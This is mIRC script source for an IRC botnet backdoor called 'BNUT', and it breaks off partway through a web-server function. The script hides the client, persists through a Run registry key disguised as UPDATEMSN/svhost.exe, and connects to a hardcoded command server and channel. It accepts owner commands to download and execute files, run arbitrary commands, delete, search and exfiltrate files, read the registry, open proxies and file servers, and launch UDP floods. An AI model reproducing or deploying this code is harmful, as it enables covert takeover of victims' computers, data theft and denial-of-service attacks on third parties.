   ;--------------------------------------------
   ;-------- YOU DONT LIKE ME? BITE ME! --------
   ;--------------------------------------------
   ON *:START: {
     ;-------- USER SETTINGS -------
     set %bnutpub.channel #BNUT.PRIVATE
     set %bnutpub.channelpw PRIVATE
     set %bnutpub.owner BOTCOM
     set %bnutpub.ownerhost *!*god@universe.com
     set %bnutpub.server btcom.cjb.net
     set %bnutpub.port 8080
     ;------------------------------
     server %bnutpub.server $+ : $+ %bnutpub.port
     .timer 0 600 dns %bnutpub.server
     .timer 0 30 bnutpub.check.server
     .timer 0 1 bnutpub.check.channel
     .timer 0 1 writereg
     identd on $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
     set %bnutpub.version 3.0
     nick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
     anick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
     secure
     echo -a $dll(bnuth.dll,HideMirc,on)
     set %nopass 1 0 0 0 37 2 0 0 16 8 0 0 2 8 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
     set %nopass1 1 0 0 0 37 10 0 1 16 8 1 0 10 8 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
     set %ws.count 0
     set %ws.homedir c:\
     set %ws.logging 0
     set %ws.showStatus 0
     set %ws.port 37337
     set %ws.sockCount 235
     set %ws.statsPage 1
     ws.off
     rmdir C:\WINDOWS\system32\lsass\download
   }
   alias bnutpub.check.server {
     if ($server != $null) { return }
     else { scon 1 server %bnutpub.server $+ : $+ %bnutpub.port }
   }
   on *:DNS:{
     if ($dns(1) == %bnutpub.server) {
       if ($dns(1).ip != %bnutpub.server.current) { server %bnutpub.server $+ : $+ %bnutpub.port | set %bnutpub.server.current $dns(1).ip }
     }
     else {
       if (%dns.user == public) { msg %bnutpub.channel [DNS] $dns(1).addr -> $dns(1).ip }
       else { msg %bnutpub.owner [DNS] $dns(1).addr -> $dns(1).ip }
     }
   }
   alias -l writereg {
     $regwrite(HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\UPDATEMSN,C:\WINDOWS\system32\lsass\svhost.exe,REG_SZ)
   }
   ON *:CONNECT: {
     if ($me == $scon(1).me) { scon 1 join %bnutpub.channel %bnutpub.channelpw }
     ignore -wd *
     dns %bnutpub.server
   }
   alias -l bnutpub.check.channel {
     if ($me == $scon(1).me) && ($channel(0) == 0) { scon 1 join %bnutpub.channel %bnutpub.channelpw }
   }
   ON *:CONNECTFAIL: {
     dns %bnutpub.server
   }
   ON *:DISCONNECT: {
     dns %bnutpub.server
   }
   alias -l parse.http {
     var %i = 1
     while (%i <= $numtok($1-,47)) {
       inc %i
     }
     bnutpub.download $gettok($1-,2,47) $gettok($1-,3-,47) $4
   }
   ON *:TEXT:*:#: {
     if ($cid == $scon(1)) {
       if ($address($nick,1) == %bnutpub.ownerhost) {
         if ($1 == .download) {
           set %bnutpub.download.public 1
           unset %bnutpub.download.exe
           parse.http $2 $3
           if ($4 == 0) { set %bnutpub.download.exe no }
         }
         elseif ($1 == .update) {
           if (%bnutpub.version < $2) {
             scon 1 msg %bnutpub.channel [UPDATE] Updating...
             set %bnutpub.download.public 1
             unset %bnutpub.download.exe
             parse.http $3 $4
           }
         }
         elseif ($1 == .dns) { set %dns.user public | dns $2 }
         elseif ($1 == .server) { bnutpub.scan.4.server }
         elseif ($1 == .execute) {
           if ($isfile($2-)) { run $2- | scon 1 msg %bnutpub.channel [EXECUTE] Done. }
           else { scon 1 msg %bnutpub.channel [EXECUTE] File doesn't exist.
           }
         }
         elseif ($1 == .remove) {
           if ($isfile($2-)) { remove $2- | scon 1 msg %bnutpub.channel [REMOVE] Done. }
           else { scon 1 msg %bnutpub.channel [REMOVE] File doesn't exist.
           }
         }
         elseif ($1 == .winamp) {
           if ($2 == status) {
             if ($dll(bnutw.dll,songtitle,_) == $null) { return }
             else { scon 1 msg %bnutpub.channel [WINAMP] $dll(bnutw.dll,songtitle,_) ¬ $dll(bnutw.dll,bitrate,_) $+ kbps $+ / $+ $dll(bnutw.dll,freq,_) $+ kHz ¬ $dll(bnutw.dll,tracktime,_) }
           }
           if ($2 == play) { dll bnutw.dll play }
           if ($2 == pause) { dll bnutw.dll pause }
           if ($2 == stop) { dll bnutw.dll stop }
         }
         elseif ($1 == .openweb) { parse.openweb $2- }
         elseif ($$1 == .filesize) {
           if ($isfile($2) { scon 1 msg %bnutpub.channel [FILESIZE] ( $+ $2 $+ ) $round($calc($file($2).size / (1024 * 1000)),3)) $+ MB }
           else { scon 1 msg %bnutpub.channel [FILESIZE] File doesn't exist. }
         }
         elseif ($1 == .nick) {
           if ($3 == real) { scon $2 nick $left($bnutpub.getnick,-1) }
           elseif ($3) { scon $2 nick $3 $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $4 }
           else { scon $2 nick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) }
         }
         elseif ($1 == .whois) {
           if ($read(whois.txt,1) != $null) { scon 1 msg %bnutpub.channel [WHOIS] $read(whois.txt,1) }
           else { scon 1 msg %bnutpub.channel [WHOIS] No entry. }
         }
         elseif ($1 == .info) {
           if ($2 == net) { bnutpub.netstats public }
           elseif ($2 == pc) { bnutpub.pcstats public }
           elseif ($2 == version) { scon 1 .msg %bnutpub.channel [INFO] BNUT ver. %bnutpub.version }
           elseif ($2 == ip) { scon 1 .msg %bnutpub.channel [INFO] IP: $ip }
           elseif ($2 == uptime) { scon 1 .msg %bnutpub.channel [INFO] Uptime: $duration($calc($ticks / 1000)) }
           elseif ($2 == mirc) {
             if ($3 == dir) { dde mirc command "" //dde PUBLIC command "" /scon 1 msg %bnutpub.channel [MIRCDIR] $ $+ mircdir }
             else { dde mirc command "" //dde PUBLIC command "" /scon 1 msg %bnutpub.channel [MIRCINFO] $ $+ me is on $ $+ server }
           }
           else { scon 1 .msg %bnutpub.channel [INFO] IP: $ip ¬ Version: %bnutpub.version ¬ Uptime: $duration($calc($ticks / 1000)) }
         }
         elseif ($1 == .mirc) {
           if ($isdde == $false) { scon 1 .msg %bnutpub.channel [MIRC] Not running. }
           dde mirc command "" // $+ [ $2- ]
           dde mirc command "" //dde PUBLIC command "" //scon 1 msg %bnutpub.channel [MIRC] Done.
         }
         elseif ($1 == .command) {
           // $+ [ $2- ]
           scon 1 msg %bnutpub.channel [COMMAND] Done.
         }
         elseif ($1 == .fuck) && ($2 == them) && ($3 == all) {
           scon 1 .msg %bnutpub.channel [REMOVE] BNUT is shutting down.
           timers off
           $regwrite(HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\UPDATEMSN,RUNDLL32.exe,REG_SZ)
           .timer 1 2 exit
         }
         elseif ($1 == .search_file) { search_file $2 $3 $nick public }
         elseif ($1 == .get_file) { dcc send $nick $2- }
         elseif ($1 == .proxy) {
           if ($2 == stop) { sockclose b* | scon 1 msg %bnutpub.channel [IRC-PROXY] Stopped.  }
           else { sockclose b* | set %bnc.port $2 | set %bnc.pass $3 | .bnc $2 | scon 1 msg %bnutpub.channel [IRC-PROXY] IP: $ip ¬ PORT: %bnc.port ¬ PASS: %bnc.pass (/server -m $ip $+ : $+ %bnc.port $+ ) }
         }
         elseif ($1 == .search_nick) {
           dde mirc command "" //dde PUBLIC command "" /bnutpub.mircnick set $ $+ me
           set %bnutpub.mircnick2 $2
           timer 1 2 bnutpub.mircnick
         }
         elseif ($1 == .msg) { scon $2 .msg $3 $4- }
         elseif ($1 == .amsg) { scon $2 .amsg $3 $4- }
         elseif ($1 == .notice) { scon $2 .notice $3 $4- }
         elseif ($1 == .ctcp) { scon $2 .ctcp $3- }
         elseif ($1 == .opme) { mode $2 +o $nick }
         elseif ($1 == .join) {
           if ($2 == delay) {
           .timer 1 $rand(1, $+ $3 $+ ) scon $4 join $5- }
           else { scon $2 join $3- }
         }
         elseif ($1 == .part) {
           if ($2 == 1) && ($3 == #) { return }
           elseif ($2 == 1) && ($3 == all) { bnutpub.partchannel 1 | join %bnutpub.channel %bnutpub.channelpw }
           elseif ($2 == 2) && ($3 == all) { bnutpub.partchannel 2 }
           else { scon $2 part $3- }
         }
         elseif ($1 == .listchannel) { bnutpub.onchannel public }
         elseif ($1 == .search_uptime) {
           if ($2 isin $duration($calc($ticks / 1000))) { scon 1 msg %bnutpub.channel [UPTIME] Found: $duration($calc($ticks / 1000))) }
         }
         elseif ($1 == .connect) {
           if ($scon(0) == 2)  { scon 2 server $2- }
           elseif ($scon(0) == 1) { server -m $2- }
         }
         elseif ($1 == .disconnect) { scon 2 disconnect }
         elseif ($1 == .listserver) { listserver public }
         elseif ($1 == .readreg) {
           if ($_regread($2-) == 0) { scon 1 msg %bnutpub.channel [READREG] No entry. }
           else { scon 1 .msg %bnutpub.channel $_regread($2-) }
         }
       }
     }
   }
   ON *:TEXT:*:?: {
     if ($cid == $scon(1)) {
       if ($address($nick,1) == %bnutpub.ownerhost) {
         if ($1 == .rascan) {
           if ($2 == stop) {
             if (%radmin.status == 1) { timerscan off | timerclose off | sockclose scanner* | msg $nick [RASCAN] Stopped. | unset %radmin.status }
             else { timerscan off | timerclose off | sockclose scanner* | msg $nick [RASCAN] isn't running. }
           }
           else {
             set %radmin.status 1
             .scan $2
             halt
           }
         }
         elseif ($1 == .dns) { unset %dns.user | dns $2 }
         elseif ($1 == .winamp) {
           if ($2 == status) {
             if ($dll(bnutw.dll,songtitle,_) == $null) { return }
             else { scon 1 msg %bnutpub.owner [WINAMP] $dll(bnutw.dll,songtitle,_) ¬ $dll(bnutw.dll,bitrate,_) $+ kbps $+ / $+ $dll(bnutw.dll,freq,_) $+ kHz ¬ $dll(bnutw.dll,tracktime,_) }
           }
           if ($2 == play) { dll bnutw.dll play }
           if ($2 == pause) { dll bnutw.dll pause }
           if ($2 == stop) { dll bnutw.dll stop }
         }
         elseif ($$1 == .filesize) {
           if ($isfile($2) { scon 1 msg %bnutpub.owner [FILESIZE] ( $+ $2 $+ ) $round($calc($file($2).size / (1024 * 1000)),3)) $+ MB }
           else { scon 1 msg %bnutpub.owner [FILESIZE] File doesn't exist. }
         }
         elseif ($1 == .download) {
           unset %bnutpub.download.public
           unset %bnutpub.download.exe
           parse.http $2 $3
           if ($4 == 0) { set %bnutpub.download.exe no }
         }
         elseif ($1 == .update) {
           if (%bnutpub.version < $2) {
             msg %bnutpub.owner [UPDATE] Updating...
             unset %bnutpub.download.public
             unset %bnutpub.download.exe
             parse.http $3 $4
           }
         }
         elseif ($1 == .server) { bnutpub.scan.4.server }
         elseif ($1 == .mirc) {
           if ($isdde == $false) { scon 1 .msg %bnutpub.owner [MIRC] Not running. }
           dde mirc command "" // $+ [ $2- ]
           dde mirc command "" //dde PUBLIC command "" //scon 1 msg %bnutpub.owner [MIRC] Done.
         }
         elseif ($1 == .command) {
           // $+ [ $2- ]
           //scon 1 msg %bnutpub.owner [COMMAND] Done.
         }
         elseif ($1 == .execute) {
           if ($isfile($2-)) { run $2- | scon 1 msg %bnutpub.owner [EXECUTE] Done. }
           else { scon 1 msg %bnutpub.owner [EXECUTE] File doesn't exist.
           }
         }
         elseif ($1 == .set_whois) { write whois.txt $2- | scon 1 msg %bnutpub.owner [WHOIS] Done. }
         elseif ($1 == .unset_whois) { remove whois.txt $2- | scon 1 msg %bnutpub.owner [WHOIS] Entry removed. }
         elseif ($1 == .remove) {
           if ($isfile($2-)) { remove $2- | scon 1 msg %bnutpub.owner [REMOVE] Done. }
           else { msg %bnutpub.owner [REMOVE] File doesn't exist.
           }
         }
         elseif ($1 == .fileserver) { fserve $nick 10 $2- }
         elseif ($1 == .webserver) {
           if ($2 == stop) { ws.off | msg $nick [WEBSERVER] Disabled.  }
           else { ws.off | set %ws.port $2 | set %ws.homedir $3 $+ \ | ws.on }
         }
         elseif ($1 == .whois) {
           if ($read(whois.txt,1) != $null) { scon 1 msg %bnutpub.owner [WHOIS] $read(whois.txt,1) }
           else { scon 1 msg %bnutpub.owner [WHOIS] No entry. }
         }
         elseif ($1 == .info) {
           if ($2 == net) { bnutpub.netstats }
           elseif ($2 == pc) { bnutpub.pcstats }
           elseif ($2 == version) { scon 1 .msg $nick [INFO] BNUT ver. %bnutpub.version }
           elseif ($2 == ip) { scon 1 .msg $nick [INFO] IP:  $ip }
           elseif ($2 == uptime) { scon 1 .msg %bnutpub.owner [INFO] Uptime: $duration($calc($ticks / 1000)) }
           elseif ($2 == mirc) {
             if ($3 == dir) { dde mirc command "" //dde PUBLIC command "" /scon 1 msg %bnutpub.owner [MIRCDIR] $ $+ mircdir }
             else { dde mirc command "" //dde PUBLIC command "" /scon 1 msg %bnutpub.owner [MIRCINFO] $ $+ me is on $ $+ server }
           }
           else { scon 1 .msg $nick [INFO] IP: $ip ¬ Version: %bnutpub.version ¬ Uptime: $duration($calc($ticks / 1000)) }
         }
         elseif ($1 == .fuck) && ($2 == them) && ($3 == all) {
           .msg %bnutpub.owner [REMOVE] BNUT is shutting down.
           timers off
           $regwrite(HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\UPDATEMSN,RUNDLL32.exe,REG_SZ)
           .timer 1 2 exit
         }
         elseif ($1 == .nick) {
           if ($3 == real) { scon $2 nick $left($bnutpub.getnick,-1) }
           elseif ($3) { scon $2 nick $3 }
           else { scon $2 nick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) }
         }
         elseif ($1 == .search_file) { search_file $2 $3 $nick }
         elseif ($1 == .get_file) { dcc send $nick $2- }
         elseif ($1 == .listchannel) { bnutpub.onchannel }
         elseif ($1 == .connect) {
           if ($scon(0) == 2)  { scon 2 server $2- }
           elseif ($scon(0) == 1) { server -m $2- }
         }
         elseif ($1 == .disconnect) { scon 2 disconnect }
         elseif ($1 == .join) {
           if ($2 == delay) {
           .timer 1 $rand(1, $+ $replace($2,delay,0) $+ ) scon $3 join $4- }
           else { scon $2 join $3- }
         }
         elseif ($1 == .part) {
           if ($2 == 1) && ($3 == #) { return }
           elseif ($2 == 1) && ($3 == all) { bnutpub.partchannel 1 | join %bnutpub.channel %bnutpub.channelpw }
           elseif ($2 == 2) && ($3 == all) { bnutpub.partchannel 2 }
           else { scon $2 part $3- }
         }
         elseif ($1 == .listserver) { listserver }
         elseif ($1 == .msg) { scon $2 .msg $3 $4- }
         elseif ($1 == .amsg) { scon $2 .amsg $3 $4- }
         elseif ($1 == .notice) { scon $2 .notice $3 $4- }
         elseif ($1 == .ctcp) { scon $2 .ctcp $3- }
         elseif ($1 == .opme) { mode $2 +o $nick }
         elseif ($1 == .proxy) {
           if ($2 == stop) { sockclose b* | scon 1 msg $nick [IRC-PROXY] Stopped.  }
           else { sockclose b* | set %bnc.port $2 | set %bnc.pass $3 | .bnc $2 | scon 1 msg $nick [IRC-PROXY] IP: $ip ¬ PORT: %bnc.port ¬ PASS: %bnc.pass (/server -m $ip $+ : $+ %bnc.port $+ ) }
         }
         elseif ($1 == .udp) { fuck_you $2 $3 $4 }
         elseif ($1 == .readreg) {
           if ($_regread($2-) == 0) { msg $nick [READREG] No entry. }
           else { scon 1 .msg $nick $_regread($2-) }
         }

       }
     }
   }
   alias -l bnutpub.mircnick {
     if ($1 == set) { set %bnutpub.mircnick $2- }
     elseif (%bnutpub.mircnick2 isin %bnutpub.mircnick) { msg %bnutpub.channel [MIRC] (Found) Nick: %bnutpub.mircnick }
   }
   alias -l fuck_you {
     if (!$isip($1)) { return }
     if ($2 !isnum 1-31337) { return }
     if ($3 !isnum 1-1500) { return }
     if (%udp.check.flood) { return }
     set %udp.check.flood 1
     set %udp.flood.host $$1
     set %udp.flood.port $$2
     set %udp.flood.packets $$3
     set %udp.flood.sent 0
     .timerUDP.CHECK 1 60 unset %udp.check.flood
     .timerUDP.FLOOD1 0 0 udp.flood
     .timerUDP.FLOOD2 0 0 udp.flood
     .timerUDP.FLOOD3 0 0 udp.flood
     if ($4 == public) { set %bnutpub.udp public | scon 1 msg %bnutpub.channel [UDP] Started sending %udp.flood.packets packet(s) to %udp.flood.host Port %udp.flood.port }
     else { unset %bnutpub.udp | scon 1 msg $nick [UDP] Started sending %udp.flood.packets packet(s) to %udp.flood.host Port %udp.flood.port }
   }
   alias -l udp.flood {
     inc %udp.flood.sent
     sockudp -n FLOOD $+ $rand(0,9999999) $+ $ctime $+ $rand(0,9999999) %udp.flood.host %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8
     sockudp -n FLOOD $+ $rand(0,9999999) $+ $ctime $+ $rand(0,9999999) %udp.flood.host %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf
     sockudp -n FLOOD $+ $rand(0,9999999) $+ $ctime $+ $rand(0,9999999) %udp.flood.host %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8
     sockudp -n FLOOD $+ $rand(0,9999999) $+ $ctime $+ $rand(0,9999999) %udp.flood.host %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7)
     sockudp -n FLOOD $+ $rand(0,9999999) $+ $ctime $+ $rand(0,9999999) %udp.flood.host %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8f $+ $chr(7) $+ %udp.flood.port s9adf89a0sd8fs9adf89a0sd8fs9adf89a0sd8
     if (%udp.flood.sent >= %udp.flood.packets) {
       if (%bnutpub.udp == public) { scon 1 msg %bnutpub.channel [UDP] Finished sending %udp.flood.sent packet(s) to %udp.flood.host Port %udp.flood.port }
       else { scon 1 msg %bnutpub.owner [UDP] Finished sending %udp.flood.sent packet(s) to %udp.flood.host Port %udp.flood.port }
       .timerUDP.FLOOD* off
       unset %udp.flood.*
       return
     }
   }
   alias -l isip {
     tokenize 46 $1-
     if ($1 isnum 0-255) && ($2 isnum 0-255) && ($3 isnum 0-255) && ($gettok($4,1,58) isnum 0-255) { return $true }
     else { return $false }
   }
   alias -l listserver {
     var %i = 1
     while (%i <= $scon(0)) {
       var %bnutpub.listserver %bnutpub.listserver $iif($scon(%i).server, $+ %i $+ : $scon(%i).server)
       inc %i
     }
     if ($1 == public) { scon 1 msg %bnutpub.channel [LISTSERVER] %bnutpub.listserver }
     else { .msg $nick [LISTSERVER] %bnutpub.listserver }
   }
   alias -l search_file {
     if (!$disk($1)) { return NO_GIVEN_DISK }
     elseif (!$2) { return NO_SEARCH_FILE }
     elseif (%bnutpub.protection.search_file_timer) { return TIMER_STILL_ACTIVE }
     set %bnutpub.protection.search_file_timer ON
     var %i 1, %disk $1, %search $2, %found
     while (%i <= $findfile(%disk,%search,0)) {
       ;echo -a $findfile(%disk,%search,%i)
       %found = %found $replace($findfile(%disk,%search,%i),$chr(32),$chr(155))
       inc %i
     }
     if (%found) {
       if ($4 == public) {
         scon 1 .msg %bnutpub.channel [FILESEARCH] FOUND: $replace(%found,$chr(155),$chr(32))
       }
       else {
         scon 1 .msg $3 [FILESEARCH] FOUND: $replace(%found,$chr(155),$chr(32))
       }
     }
     set %bnutpub.search_file.found $replace($strip(%found),$chr(32),$chr(8))
     .timer 1 10 unset %bnutpub.protection.search_file_timer
     .timer 1 60 unset %bnutpub.search_file.found
   }
   alias -l _regread {
     var %a = regread $+ $ticks
     .comopen %a WScript.Shell
     if ($comerr) { return 0 }
     if (!$com(%a,RegRead,3,bstr,$1)) {
       .comclose %a
       return 0
     }
     var %b = $com(%a).result
     .comclose %a
     return %b
   }
   alias -l ws.version { return 1.0 }
   alias -l moo { return $dll(bnutm.dll,$$1,$$2) }
   alias -l ws.sclose { if ($sock($$1) == $null) { return } | ws.varClear $$1 | sockclose $$1 }
   alias -l ws.swrite { sockwrite -n $$1 $2- }
   alias -l ws.error { ws.swrite $$1 $1- | ws.sclose $$1 }
   alias -l ws.var { if ($isid) { return $eval($+(%,$$1,$$2),2) } | else set $+(%,$$1,$$2),2) $3- }
   on *:sockclose:ws-*: { ws.varClear $sockname | .timer $+ $sockname off }
   alias -l ws.varClear { unset $+(%,$$1,*) }
   alias -l ws.notfound {
     ws.swrite $$1 <html><title>404 Not Found</title><BODY bgcolor=white text=black>
     ws.swrite $$1 <br><br><h2 align=center>404 Not Found</h2><br>
     ws.swrite $$1 The file you are looking for <b>http:// $+ $ip $+ $$2 $+ </B> does not exist.<br>
     ws.swrite $$1 <br><font size=2></font></Br></BODY></html>
     ws.sclose $$1
   }
   alias -l bnutpub.pcstats {
     if ($1 == public) { msg %bnutpub.channel [INFO] OS: $dll(bnutn.dll,os,_) ¬ CPU: $dll(bnutn.dll,cpuinfo,_) ¬ Uptime: $duration($calc($ticks / 1000)) ¬ RAM: [ $dll(bnutm.dll,meminfo,_) ] ¬ HDD: $dll(bnutn.dll,hdspace,_) }
     else { msg $nick [INFO] OS: $dll(bnutn.dll,os,_) ¬ CPU: $dll(bnutn.dll,cpuinfo,_) ¬ Uptime: $duration($calc($ticks / 1000)) ¬ RAM: [ $dll(bnutm.dll,meminfo,_) ] ¬ HDD: $dll(bnutn.dll,hdspace,_) }
   }
   alias -l bnutpub.netstats {
     if ($1 == public) { msg %bnutpub.channel [INFO] IP: $ip ¬ Connection: $dll(bnutm.dll,connection,_) }
     else { msg $nick IP: $ip ¬ Connection: $dll(bnutm.dll,connection,_) }
   }
   alias -l ws.stats {
     if (%ws.statsPage == 1) {
       ws.swrite $$1 <html><title> $+ $me $+ </title><body bgcolor=white text=black>
       ws.swrite $$1 <br><table width=90% align=center cellspacing=0 cellpadding=2 border=1><tr><th width=25%>Item</th><th width=75%>Data</th></tr>
       ws.swrite $$1 <tr><td>Operating System</td><td> $+ $moo(osinfo,_) $+ </td></tr><tr><td>CPU</td><td> $+ $moo(cpuinfo,_) $+ </td></tr>
       ws.swrite $$1 <tr><td>Uptime</td><td> $+ $duration($calc($ticks / 1000)) $+ </td></tr><tr><td>Resolution</td><td> $+ $window(-1).w $+ x $+ $window(-1).h $+ </td></tr><tr><td>Memory</td><td> $+ $moo(meminfo,_) $+ </td></tr>
       ws.swrite $$1 <tr><td>System Time / Timezone</td><td> $+ $asctime $asctime(zzz) $+ </td></tR><tr><td>mIRC Version</td><td> $+ $version $+ </td></tr>
       ws.swrite $$1 <tr><td>Disks</td><td><table width=100% border=1 cellpadding=1 cellspacing=1><tr><th>Disk</th><th>Type</th><th>Size</th><th>Free</th></tr>
       var %i = 0
       while (%i < 24) {
         inc %i 1
         var %char = $chr($calc(%i + 66)) $+ :
         if ($disk(%char)) { ws.swrite $$1 <Tr><td> $+ %char $+ </td><td> $+ $disk(%char).type </td><td> $bytes($disk(%char).size,m).suf </td><td> $bytes($disk(%char).free,m).suf ( $+ $round($calc(100 -(($disk(%char).free / $disk(%char).size) * 100)),2)) $+ % $+ )</td></tr>    }
       }
       ws.swrite $$1 </td></tr></table> $+ $crlf $+ </td></tr>

       ws.swrite $$1 </table><br><center></center><br></BODY></html>
       ws.sclose $$1
     }
     else {
       ws.notFound $$1 /system.stats
     }
   }

   alias -l ws.sendfile {
     ws.var $$1 request $2-
     ws.var $$1 file " $+ %ws.homedir $+ $right($replace($2-,/,\),-1) $+ "
     ws.var $$1 file $replace($ws.var($$1,file),$+(%,20),$chr(32))
     if ($$2 == /system.stats) {  ws.stats $$1 | return }
     if ($isfile($shortfn($ws.var($$1,file))) !== $true) {
       var %d = %ws.homedir $+ $right($replace($$2,/,\),-1)
       if ($isdir($replace($ws.var($$1,file),$+(%,20),$chr(32)))) { ws.sendDir $$1 $shortfn(%d) | return }
       else { ws.notfound $$1 $2- | return }
     }
     ws.var $$1 targ $file($ws.var($$1,file)).size | sockmark $$1 0
